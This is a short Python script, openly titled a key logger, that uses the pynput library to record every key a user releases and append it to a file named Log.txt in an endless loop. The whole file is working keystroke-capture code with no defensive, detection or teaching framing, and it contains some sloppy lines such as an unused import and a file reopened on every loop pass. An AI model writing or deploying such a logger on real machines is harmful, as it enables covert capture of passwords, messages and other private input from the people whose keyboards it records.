# Key logger

# Imports
from multiprocessing.connection import Listener
from pynput import keyboard

#function
def on_release(Key):
    print(Key)
    if Key == keyboard.Key.space:
        Key = " "
    elif Key == keyboard.Key.enter:
        Key = "\n"
    elif Key == keyboard.Key.backspace:
        Key = "[BACKSPACE]"
    f.write(str(Key).replace("'", ""))

# Listing Keyboard
listener = keyboard.Listener(on_release=on_release) 
listener.start()

# We needed this Cuz the code will exit 

while True:
    i = 0

# Create Log.txt file
    f = open("Log.txt", "a")

